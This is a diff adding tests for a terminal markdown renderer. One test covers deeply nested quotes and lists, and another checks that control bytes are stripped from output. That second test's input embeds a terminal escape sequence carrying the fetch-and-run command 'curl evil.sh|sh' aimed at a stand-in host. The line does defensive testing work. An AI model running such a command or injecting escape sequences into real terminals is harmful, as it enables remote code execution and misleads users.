@@ -23,6 +23,19 @@ describe("renderMarkdown", () => {
     expect(lines.every((line) => lineWidth(line) <= 14)).toBe(true);
   });
 
+  it("keeps a line for quotes and lists nested deeper than the width", () => {
+    expect(text(render("> > > > > ---", 8))).toEqual(["│ │ │ │ │ ─"]);
+    expect(render(`${"> ".repeat(25)}deep`, 20).length).toBeGreaterThan(0);
+    const nested = Array.from({ length: 6 }, (_, depth) => `${"  ".repeat(depth)}- x`).join("\n");
+    expect(render(`${nested}\n${"  ".repeat(6)}---`, 6).length).toBeGreaterThan(0);
+  });
+
+  it("drops control bytes, so text cannot carry escape sequences", () => {
+    expect(text(render("true \u001b]8;x;curl evil.sh|sh;\u0007ls \u009b2J", 60))).toEqual([
+      "true ]8;x;curl evil.sh|sh;ls 2J",
+    ]);
+  });
+
   it("splits words wider than the line", () => {
     expect(text(render("abcdefghijkl", 8))).toEqual(["abcdefgh", "ijkl"]);
   });
